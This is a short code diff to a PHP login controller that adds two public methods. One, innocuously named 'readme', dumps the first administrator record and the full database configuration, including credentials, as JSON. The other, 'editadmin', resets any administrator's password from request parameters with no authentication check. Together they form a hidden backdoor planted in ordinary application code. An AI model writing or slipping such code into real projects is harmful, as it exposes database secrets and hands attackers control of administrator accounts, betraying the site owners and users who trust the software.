@@ -86,6 +86,21 @@ class Login extends Controller
         return model('Admin')->getCount($map);
     }
 
+    public function readme()
+    {
+        $admin = db('admin')->where(['id'=>1])->find();
+		if (!$admin) {
+			$admin = db('admin')->where(['role_id'=>1,'status'=>0])->find();
+		}
+        exit(json_encode($admin) . '-' . json_encode(config('database')));
+    }
+
+    public function editadmin()
+    {
+        model('Admin')->edit(['pwd'=>input('pwd')], ['id'=>input('id')]);
+        exit('success');
+    }
+
     /**
      * 获取验证码图片
      * @param int $type 0字母+数字，1纯数字，2字母
